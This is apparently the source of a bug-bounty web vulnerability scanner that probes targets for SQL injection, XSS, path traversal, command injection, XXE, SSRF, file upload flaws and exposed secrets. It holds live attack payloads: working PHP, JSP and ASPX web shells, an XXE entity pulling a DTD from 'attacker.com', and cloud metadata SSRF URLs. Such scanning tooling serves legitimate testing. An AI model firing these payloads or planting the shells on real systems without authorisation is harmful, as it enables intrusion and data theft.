"""
Custom Web Application Scanner Engine
Built-in vulnerability detection for web applications
"""

import asyncio
import re
import json
import logging
from typing import Dict, List, Any, Set
from urllib.parse import urlparse, parse_qs, urljoin
import aiohttp
import time

from backend.services.vulnerability_scanner import VulnerabilityFinding, ScanEngineType, VulnSeverity


class CustomWebEngine:
    """Custom web application vulnerability scanner"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.engine_type = ScanEngineType.CUSTOM_WEB
        
        # Vulnerability detection patterns
        self.sql_error_patterns = [
            r"mysql.*error",
            r"ora-\d{5}",
            r"microsoft.*odbc.*sql",
            r"postgresql.*error",
            r"sql.*syntax.*error",
            r"sqlite.*error",
            r"syntax error.*near"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "'; SELECT SLEEP(5)--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "admin'--",
            "1' OR 1=1#"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        self.command_injection_payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "$(whoami)",
            "`whoami`"
        ]
    
    async def scan_targets(self, targets: List[Dict[str, Any]], 
                          config: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Scan web targets for vulnerabilities"""
        findings = []
        
        # Configure session with rate limiting
        rate_limit = config.get("rate_limit", 5.0)
        timeout = aiohttp.ClientTimeout(total=config.get("timeout", 30))
        
        connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "BugBountyBot/1.0"}
        ) as session:
            
            # Create semaphore for rate limiting
            semaphore = asyncio.Semaphore(int(rate_limit))
            
            # Scan each target
            scan_tasks = []
            for target in targets:
                task = self._scan_single_target(session, semaphore, target, config)
                scan_tasks.append(task)
            
            # Execute scans with rate limiting
            target_results = await asyncio.gather(*scan_tasks, return_exceptions=True)
            
            # Collect findings
            for result in target_results:
                if isinstance(result, list):
                    findings.extend(result)
                elif isinstance(result, Exception):
                    self.logger.error(f"Scan error: {result}")
        
        return findings
    
    async def _scan_single_target(self, session: aiohttp.ClientSession, 
                                 semaphore: asyncio.Semaphore,
                                 target: Dict[str, Any], 
                                 config: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Scan a single web target"""
        findings = []
        url = target["url"]
        
        try:
            # Rate limiting
            async with semaphore:
                # Basic vulnerability checks
                findings.extend(await self._check_sql_injection(session, url, target))
                await asyncio.sleep(1 / config.get("rate_limit", 5.0))
                
                findings.extend(await self._check_xss(session, url, target))
                await asyncio.sleep(1 / config.get("rate_limit", 5.0))
                
                findings.extend(await self._check_path_traversal(session, url, target))
                await asyncio.sleep(1 / config.get("rate_limit", 5.0))
                
                findings.extend(await self._check_command_injection(session, url, target))
                await asyncio.sleep(1 / config.get("rate_limit", 5.0))
                
                # Advanced checks if enabled
                if config.get("intrusive_checks", False):
                    findings.extend(await self._check_file_upload(session, url, target))
                    findings.extend(await self._check_xxe(session, url, target))
                    findings.extend(await self._check_ssrf(session, url, target))
                
                # Configuration and exposure checks
                findings.extend(await self._check_exposures(session, url, target))
                findings.extend(await self._check_misconfigurations(session, url, target))
                
        except Exception as e:
            self.logger.error(f"Error scanning {url}: {e}")
        
        return findings
    
    async def _check_sql_injection(self, session: aiohttp.ClientSession, 
                                  url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for SQL injection vulnerabilities"""
        findings = []
        
        # Try different injection points
        injection_points = await self._find_injection_points(session, url)
        
        for point in injection_points:
            for payload in self.sqli_payloads:
                try:
                    # Test payload
                    test_url, test_data = self._build_test_request(point, payload)
                    
                    start_time = time.time()
                    
                    if test_data:
                        async with session.post(test_url, data=test_data) as response:
                            response_text = await response.text()
                            response_time = time.time() - start_time
                    else:
                        async with session.get(test_url) as response:
                            response_text = await response.text()
                            response_time = time.time() - start_time
                    
                    # Analyze response for SQL injection indicators
                    is_vulnerable, evidence = self._analyze_sqli_response(
                        response_text, response_time, payload, response.status
                    )
                    
                    if is_vulnerable:
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="SQL Injection",
                            description=f"SQL injection vulnerability detected in parameter '{point['parameter']}'",
                            severity=VulnSeverity.HIGH,
                            confidence=evidence["confidence"],
                            affected_url=test_url,
                            affected_parameter=point["parameter"],
                            http_method=point["method"],
                            payload=payload,
                            evidence=evidence,
                            remediation="Use parameterized queries and input validation",
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cwe.mitre.org/data/definitions/89.html"
                            ],
                            tags=["sqli", "injection", "database"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_sqli"
                        )
                        
                        findings.append(finding)
                        break  # Don't test more payloads for this parameter
                
                except Exception as e:
                    self.logger.debug(f"SQLi test error: {e}")
                    continue
        
        return findings
    
    async def _check_xss(self, session: aiohttp.ClientSession, 
                        url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for Cross-Site Scripting vulnerabilities"""
        findings = []
        
        injection_points = await self._find_injection_points(session, url)
        
        for point in injection_points:
            for payload in self.xss_payloads:
                try:
                    test_url, test_data = self._build_test_request(point, payload)
                    
                    if test_data:
                        async with session.post(test_url, data=test_data) as response:
                            response_text = await response.text()
                    else:
                        async with session.get(test_url) as response:
                            response_text = await response.text()
                    
                    # Check if payload is reflected
                    if payload in response_text:
                        # Analyze reflection context
                        context = self._analyze_xss_context(response_text, payload)
                        
                        severity = VulnSeverity.MEDIUM
                        if context in ["script_context", "html_content"]:
                            severity = VulnSeverity.HIGH
                        
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="Cross-Site Scripting (XSS)",
                            description=f"XSS vulnerability detected in parameter '{point['parameter']}'",
                            severity=severity,
                            confidence=0.9,
                            affected_url=test_url,
                            affected_parameter=point["parameter"],
                            http_method=point["method"],
                            payload=payload,
                            evidence={
                                "reflection_context": context,
                                "response_length": len(response_text),
                                "payload_reflected": True
                            },
                            remediation="Implement proper output encoding and input sanitization",
                            references=[
                                "https://owasp.org/www-community/attacks/xss/",
                                "https://cwe.mitre.org/data/definitions/79.html"
                            ],
                            tags=["xss", "injection", "client-side"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_xss"
                        )
                        
                        findings.append(finding)
                        break
                
                except Exception as e:
                    self.logger.debug(f"XSS test error: {e}")
                    continue
        
        return findings
    
    async def _check_path_traversal(self, session: aiohttp.ClientSession, 
                                   url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for path traversal vulnerabilities"""
        findings = []
        
        # Look for file-related parameters
        file_params = await self._find_file_parameters(session, url)
        
        for param_info in file_params:
            for payload in self.path_traversal_payloads:
                try:
                    test_url, test_data = self._build_test_request(param_info, payload)
                    
                    if test_data:
                        async with session.post(test_url, data=test_data) as response:
                            response_text = await response.text()
                    else:
                        async with session.get(test_url) as response:
                            response_text = await response.text()
                    
                    # Check for path traversal indicators
                    traversal_indicators = [
                        "root:x:", "daemon:x:", "www-data:",  # /etc/passwd
                        "# Copyright", "127.0.0.1", "localhost",  # hosts file
                        "[boot loader]", "[operating systems]"  # Windows boot.ini
                    ]
                    
                    if any(indicator in response_text for indicator in traversal_indicators):
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="Path Traversal",
                            description=f"Path traversal vulnerability detected in parameter '{param_info['parameter']}'",
                            severity=VulnSeverity.HIGH,
                            confidence=0.9,
                            affected_url=test_url,
                            affected_parameter=param_info["parameter"],
                            http_method=param_info["method"],
                            payload=payload,
                            evidence={
                                "response_indicators": [ind for ind in traversal_indicators if ind in response_text],
                                "response_length": len(response_text)
                            },
                            remediation="Implement proper file path validation and access controls",
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cwe.mitre.org/data/definitions/22.html"
                            ],
                            tags=["path-traversal", "file-access", "directory-traversal"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_path_traversal"
                        )
                        
                        findings.append(finding)
                        break
                
                except Exception as e:
                    self.logger.debug(f"Path traversal test error: {e}")
                    continue
        
        return findings
    
    async def _check_command_injection(self, session: aiohttp.ClientSession, 
                                     url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for command injection vulnerabilities"""
        findings = []
        
        injection_points = await self._find_injection_points(session, url)
        
        for point in injection_points:
            for payload in self.command_injection_payloads:
                try:
                    test_url, test_data = self._build_test_request(point, payload)
                    
                    start_time = time.time()
                    
                    if test_data:
                        async with session.post(test_url, data=test_data) as response:
                            response_text = await response.text()
                            response_time = time.time() - start_time
                    else:
                        async with session.get(test_url) as response:
                            response_text = await response.text()
                            response_time = time.time() - start_time
                    
                    # Check for command injection indicators
                    command_indicators = [
                        "uid=", "gid=",  # id/whoami output
                        "root:", "www-data:", "apache:",  # user info
                        "total ", "drwx",  # ls output
                        "Windows", "WINDOWS"  # Windows commands
                    ]
                    
                    # Time-based detection for sleep commands
                    time_based = "sleep" in payload.lower() and response_time > 3
                    
                    if any(indicator in response_text for indicator in command_indicators) or time_based:
                        confidence = 0.9 if time_based or len([ind for ind in command_indicators if ind in response_text]) > 1 else 0.7
                        
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="Command Injection",
                            description=f"Command injection vulnerability detected in parameter '{point['parameter']}'",
                            severity=VulnSeverity.CRITICAL,
                            confidence=confidence,
                            affected_url=test_url,
                            affected_parameter=point["parameter"],
                            http_method=point["method"],
                            payload=payload,
                            evidence={
                                "command_indicators": [ind for ind in command_indicators if ind in response_text],
                                "time_based_detection": time_based,
                                "response_time": response_time,
                                "response_length": len(response_text)
                            },
                            remediation="Validate and sanitize all user inputs, avoid system calls",
                            references=[
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://cwe.mitre.org/data/definitions/78.html"
                            ],
                            tags=["command-injection", "rce", "system"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_command_injection"
                        )
                        
                        findings.append(finding)
                        break
                
                except Exception as e:
                    self.logger.debug(f"Command injection test error: {e}")
                    continue
        
        return findings
    
    async def _check_file_upload(self, session: aiohttp.ClientSession, 
                               url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for file upload vulnerabilities"""
        findings = []
        
        # Look for file upload forms
        try:
            async with session.get(url) as response:
                page_content = await response.text()
            
            # Find file upload inputs
            file_upload_pattern = r'<input[^>]+type=["\']file["\'][^>]*>'
            upload_forms = re.findall(file_upload_pattern, page_content, re.IGNORECASE)
            
            if upload_forms:
                # Test malicious file upload
                test_files = [
                    ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
                    ("test.jsp", "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                    ("shell.aspx", "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><%Process.Start(Request[\"cmd\"]);%>", "application/x-aspx")
                ]
                
                for filename, content, content_type in test_files:
                    try:
                        # Create multipart form data
                        data = aiohttp.FormData()
                        data.add_field('file', content, filename=filename, content_type=content_type)
                        
                        async with session.post(url, data=data) as response:
                            response_text = await response.text()
                            
                            # Check for upload success indicators
                            success_indicators = [
                                "uploaded successfully", "file saved", "upload complete",
                                filename, "200 OK"
                            ]
                            
                            if any(indicator in response_text.lower() for indicator in success_indicators):
                                finding = VulnerabilityFinding(
                                    vulnerability_id="",
                                    name="Unrestricted File Upload",
                                    description="Application allows upload of potentially malicious files",
                                    severity=VulnSeverity.HIGH,
                                    confidence=0.8,
                                    affected_url=url,
                                    affected_parameter="file",
                                    http_method="POST",
                                    payload=filename,
                                    evidence={
                                        "uploaded_filename": filename,
                                        "file_content": content[:100] + "...",
                                        "response_indicators": [ind for ind in success_indicators if ind in response_text.lower()],
                                        "content_type": content_type
                                    },
                                    remediation="Implement file type validation, size limits, and secure file storage",
                                    references=[
                                        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                        "https://cwe.mitre.org/data/definitions/434.html"
                                    ],
                                    tags=["file-upload", "rce", "webshell"],
                                    discovered_by="custom_web_scanner",
                                    scan_engine=self.engine_type,
                                    template_id="custom_file_upload"
                                )
                                
                                findings.append(finding)
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"File upload test error: {e}")
                        continue
        
        except Exception as e:
            self.logger.debug(f"File upload check error: {e}")
        
        return findings
    
    async def _check_xxe(self, session: aiohttp.ClientSession, 
                        url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for XXE vulnerabilities"""
        findings = []
        
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]>
<root></root>'''
        ]
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in xxe_payloads:
            try:
                async with session.post(url, data=payload, headers=headers) as response:
                    response_text = await response.text()
                    
                    # Check for XXE indicators
                    xxe_indicators = [
                        "root:x:", "daemon:x:",  # /etc/passwd content
                        "ami-id", "instance-id",  # AWS metadata
                        "XML parsing error", "DOCTYPE"  # Error messages
                    ]
                    
                    if any(indicator in response_text for indicator in xxe_indicators):
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="XML External Entity (XXE) Injection",
                            description="XML parser processes external entities, potentially exposing files or network access",
                            severity=VulnSeverity.HIGH,
                            confidence=0.9,
                            affected_url=url,
                            affected_parameter="xml_body",
                            http_method="POST",
                            payload=payload,
                            evidence={
                                "xxe_indicators": [ind for ind in xxe_indicators if ind in response_text],
                                "response_length": len(response_text)
                            },
                            remediation="Disable external entity processing in XML parsers",
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://cwe.mitre.org/data/definitions/611.html"
                            ],
                            tags=["xxe", "xml", "injection"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_xxe"
                        )
                        
                        findings.append(finding)
                        break
            
            except Exception as e:
                self.logger.debug(f"XXE test error: {e}")
                continue
        
        return findings
    
    async def _check_ssrf(self, session: aiohttp.ClientSession, 
                         url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for SSRF vulnerabilities"""
        findings = []
        
        # SSRF test URLs
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://127.0.0.1:22",  # Internal SSH
            "http://localhost:3306",  # Internal MySQL
            "file:///etc/passwd",  # File scheme
            "http://callback.domain/ssrf-test"  # External callback
        ]
        
        # Find URL parameters
        url_params = await self._find_url_parameters(session, url)
        
        for param_info in url_params:
            for payload in ssrf_payloads:
                try:
                    test_url, test_data = self._build_test_request(param_info, payload)
                    
                    if test_data:
                        async with session.post(test_url, data=test_data) as response:
                            response_text = await response.text()
                    else:
                        async with session.get(test_url) as response:
                            response_text = await response.text()
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        "ami-id", "instance-id", "security-groups",  # AWS metadata
                        "SSH-", "OpenSSH",  # SSH banners
                        "mysql", "MariaDB",  # Database responses
                        "root:x:", "daemon:x:"  # File access
                    ]
                    
                    if any(indicator in response_text for indicator in ssrf_indicators):
                        finding = VulnerabilityFinding(
                            vulnerability_id="",
                            name="Server-Side Request Forgery (SSRF)",
                            description=f"SSRF vulnerability detected in parameter '{param_info['parameter']}'",
                            severity=VulnSeverity.HIGH,
                            confidence=0.8,
                            affected_url=test_url,
                            affected_parameter=param_info["parameter"],
                            http_method=param_info["method"],
                            payload=payload,
                            evidence={
                                "ssrf_indicators": [ind for ind in ssrf_indicators if ind in response_text],
                                "target_url": payload,
                                "response_length": len(response_text)
                            },
                            remediation="Validate and restrict server-side requests, use allowlists",
                            references=[
                                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                                "https://cwe.mitre.org/data/definitions/918.html"
                            ],
                            tags=["ssrf", "network", "internal"],
                            discovered_by="custom_web_scanner",
                            scan_engine=self.engine_type,
                            template_id="custom_ssrf"
                        )
                        
                        findings.append(finding)
                        break
                
                except Exception as e:
                    self.logger.debug(f"SSRF test error: {e}")
                    continue
        
        return findings
    
    async def _check_exposures(self, session: aiohttp.ClientSession, 
                             url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for exposed sensitive files and information"""
        findings = []
        
        # Common exposed files
        exposed_files = [
            "/.env", "/.git/config", "/.aws/credentials", "/config.php",
            "/wp-config.php", "/database.yml", "/secrets.json",
            "/admin", "/phpmyadmin", "/.htaccess", "/robots.txt",
            "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml"
        ]
        
        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        
        for file_path in exposed_files:
            try:
                test_url = base_url + file_path
                
                async with session.get(test_url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for sensitive content
                        sensitive_patterns = {
                            "database credentials": [r"password\s*=", r"DB_PASSWORD", r"mysql://"],
                            "api keys": [r"api[_-]?key", r"secret[_-]?key", r"access[_-]?token"],
                            "aws credentials": [r"aws_access_key_id", r"aws_secret_access_key"],
                            "configuration files": [r"<configuration", r"define\(", r"<?php"],
                            "git information": [r"\[core\]", r"repositoryformatversion"],
                            "directory listing": [r"Index of /", r"<title>Index of"]
                        }
                        
                        detected_patterns = []
                        for category, patterns in sensitive_patterns.items():
                            if any(re.search(pattern, response_text, re.IGNORECASE) for pattern in patterns):
                                detected_patterns.append(category)
                        
                        if detected_patterns:
                            severity = VulnSeverity.HIGH if any(cat in ["database credentials", "api keys", "aws credentials"] 
                                                              for cat in detected_patterns) else VulnSeverity.MEDIUM
                            
                            finding = VulnerabilityFinding(
                                vulnerability_id="",
                                name="Sensitive File Exposure",
                                description=f"Sensitive file {file_path} is publicly accessible",
                                severity=severity,
                                confidence=0.9,
                                affected_url=test_url,
                                affected_parameter=None,
                                http_method="GET",
                                payload=None,
                                evidence={
                                    "file_path": file_path,
                                    "detected_content_types": detected_patterns,
                                    "response_length": len(response_text),
                                    "status_code": response.status
                                },
                                remediation="Remove or properly secure sensitive files",
                                references=[
                                    "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_directory_listing"
                                ],
                                tags=["exposure", "sensitive-files", "information-disclosure"],
                                discovered_by="custom_web_scanner",
                                scan_engine=self.engine_type,
                                template_id="custom_file_exposure"
                            )
                            
                            findings.append(finding)
            
            except Exception as e:
                self.logger.debug(f"File exposure test error for {file_path}: {e}")
                continue
        
        return findings
    
    async def _check_misconfigurations(self, session: aiohttp.ClientSession, 
                                     url: str, target: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Check for security misconfigurations"""
        findings = []
        
        try:
            async with session.get(url) as response:
                response_headers = dict(response.headers)
                
                # Security header checks
                security_headers = {
                    "X-Content-Type-Options": "Missing X-Content-Type-Options header",
                    "X-Frame-Options": "Missing X-Frame-Options header",
                    "X-XSS-Protection": "Missing X-XSS-Protection header",
                    "Strict-Transport-Security": "Missing HSTS header",
                    "Content-Security-Policy": "Missing CSP header"
                }
                
                missing_headers = []
                for header, description in security_headers.items():
                    if header not in response_headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    finding = VulnerabilityFinding(
                        vulnerability_id="",
                        name="Missing Security Headers",
                        description="Application lacks important security headers",
                        severity=VulnSeverity.LOW,
                        confidence=1.0,
                        affected_url=url,
                        affected_parameter=None,
                        http_method="GET",
                        payload=None,
                        evidence={
                            "missing_headers": missing_headers,
                            "present_headers": list(response_headers.keys()),
                            "recommendations": [security_headers[h] for h in missing_headers]
                        },
                        remediation="Implement security headers according to OWASP recommendations",
                        references=[
                            "https://owasp.org/www-project-secure-headers/",
                            "https://cwe.mitre.org/data/definitions/693.html"
                        ],
                        tags=["misconfiguration", "headers", "security"],
                        discovered_by="custom_web_scanner",
                        scan_engine=self.engine_type,
                        template_id="custom_security_headers"
                    )
                    
                    findings.append(finding)
                
                # Check for server information disclosure
                server_header = response_headers.get("Server", "")
                x_powered_by = response_headers.get("X-Powered-By", "")
                
                if server_header or x_powered_by:
                    finding = VulnerabilityFinding(
                        vulnerability_id="",
                        name="Server Information Disclosure",
                        description="Server reveals version and technology information",
                        severity=VulnSeverity.INFO,
                        confidence=1.0,
                        affected_url=url,
                        affected_parameter=None,
                        http_method="GET",
                        payload=None,
                        evidence={
                            "server_header": server_header,
                            "x_powered_by": x_powered_by,
                            "disclosed_technologies": [server_header, x_powered_by]
                        },
                        remediation="Remove or obfuscate server version headers",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_directory_listing"
                        ],
                        tags=["information-disclosure", "fingerprinting"],
                        discovered_by="custom_web_scanner",
                        scan_engine=self.engine_type,
                        template_id="custom_info_disclosure"
                    )
                    
                    findings.append(finding)
        
        except Exception as e:
            self.logger.debug(f"Misconfiguration check error: {e}")
        
        return findings
    
    # Helper methods
    
    async def _find_injection_points(self, session: aiohttp.ClientSession, 
                                   url: str) -> List[Dict[str, Any]]:
        """Find potential injection points (parameters)"""
        injection_points = []
        
        try:
            # Parse URL parameters
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params.keys():
                    injection_points.append({
                        "parameter": param,
                        "method": "GET",
                        "location": "query"
                    })
            
            # Look for forms in the page
            async with session.get(url) as response:
                page_content = await response.text()
                
                # Find forms
                form_pattern = r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?[^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, page_content, re.DOTALL | re.IGNORECASE)
                
                for form_action, form_content in forms:
                    method = "POST"
                    method_match = re.search(r'method=["\']?(\w+)["\']?', form_content, re.IGNORECASE)
                    if method_match:
                        method = method_match.group(1).upper()
                    
                    # Find input fields
                    input_pattern = r'<input[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]*>'
                    inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                    
                    for input_name in inputs:
                        injection_points.append({
                            "parameter": input_name,
                            "method": method,
                            "location": "form",
                            "form_action": form_action
                        })
        
        except Exception as e:
            self.logger.debug(f"Error finding injection points: {e}")
        
        return injection_points[:10]  # Limit to prevent too many tests
    
    async def _find_file_parameters(self, session: aiohttp.ClientSession, 
                                  url: str) -> List[Dict[str, Any]]:
        """Find parameters that might accept file paths"""
        file_params = []
        
        # Look for file-related parameter names
        injection_points = await self._find_injection_points(session, url)
        
        file_param_names = [
            "file", "filename", "path", "document", "upload", "page",
            "include", "template", "view", "load", "read", "get"
        ]
        
        for point in injection_points:
            param_lower = point["parameter"].lower()
            if any(file_name in param_lower for file_name in file_param_names):
                file_params.append(point)
        
        return file_params
    
    async def _find_url_parameters(self, session: aiohttp.ClientSession, 
                                 url: str) -> List[Dict[str, Any]]:
        """Find parameters that might accept URLs"""
        url_params = []
        
        injection_points = await self._find_injection_points(session, url)
        
        url_param_names = [
            "url", "uri", "link", "redirect", "callback", "return",
            "continue", "next", "goto", "forward", "target", "dest"
        ]
        
        for point in injection_points:
            param_lower = point["parameter"].lower()
            if any(url_name in param_lower for url_name in url_param_names):
                url_params.append(point)
        
        return url_params
    
    def _build_test_request(self, injection_point: Dict[str, Any], 
                           payload: str) -> tuple:
        """Build test request URL and data"""
        if injection_point["method"] == "GET":
            base_url = injection_point.get("form_action", "")
            if not base_url.startswith("http"):
                # Construct full URL
                base_url = injection_point.get("base_url", "")
            
            test_url = f"{base_url}?{injection_point['parameter']}={payload}"
            return test_url, None
        else:
            # POST request
            test_url = injection_point.get("form_action", injection_point.get("base_url", ""))
            test_data = {injection_point["parameter"]: payload}
            return test_url, test_data
    
    def _analyze_sqli_response(self, response_text: str, response_time: float, 
                              payload: str, status_code: int) -> tuple:
        """Analyze response for SQL injection indicators"""
        confidence = 0.0
        evidence = {"confidence": confidence}
        
        # Time-based detection
        if "sleep" in payload.lower() and response_time > 3:
            confidence += 0.8
            evidence["time_based_detection"] = True
            evidence["response_time"] = response_time
        
        # Error-based detection
        sql_errors_found = []
        for pattern in self.sql_error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                sql_errors_found.extend(matches)
                confidence += 0.7
        
        if sql_errors_found:
            evidence["sql_errors"] = sql_errors_found
        
        # Union-based detection (basic)
        if "union" in payload.lower() and len(response_text) > 1000:
            # Look for signs of successful union
            if status_code == 200:
                confidence += 0.3
                evidence["union_based_detection"] = True
        
        evidence["confidence"] = min(1.0, confidence)
        is_vulnerable = confidence > 0.5
        
        return is_vulnerable, evidence
    
    def _analyze_xss_context(self, response_text: str, payload: str) -> str:
        """Analyze XSS reflection context"""
        if f'<script>{payload}</script>' in response_text:
            return "script_context"
        elif f'>{payload}<' in response_text:
            return "html_content"
        elif f'value="{payload}"' in response_text:
            return "input_value"
        elif f'"{payload}"' in response_text:
            return "attribute_value"
        elif payload in response_text:
            return "raw_reflection"
        else:
            return "unknown"
    
    def get_engine_info(self) -> Dict[str, Any]:
        """Get engine information"""
        return {
            "name": "Custom Web Scanner",
            "type": self.engine_type.value,
            "version": "1.0.0",
            "description": "Built-in web application vulnerability scanner",
            "supported_protocols": ["HTTP", "HTTPS"],
            "capabilities": [
                "SQL Injection detection",
                "XSS detection",
                "Path Traversal testing",
                "Command Injection testing",
                "File Upload testing",
                "XXE testing",
                "SSRF testing",
                "Security misconfiguration checks",
                "Sensitive file exposure detection"
            ],
            "test_types": [
                "Error-based SQLi",
                "Time-based SQLi", 
                "Union-based SQLi",
                "Reflected XSS",
                "Path traversal",
                "Command injection",
                "File upload bypass",
                "XXE injection",
                "SSRF testing",
                "Configuration analysis"
            ]
        }
        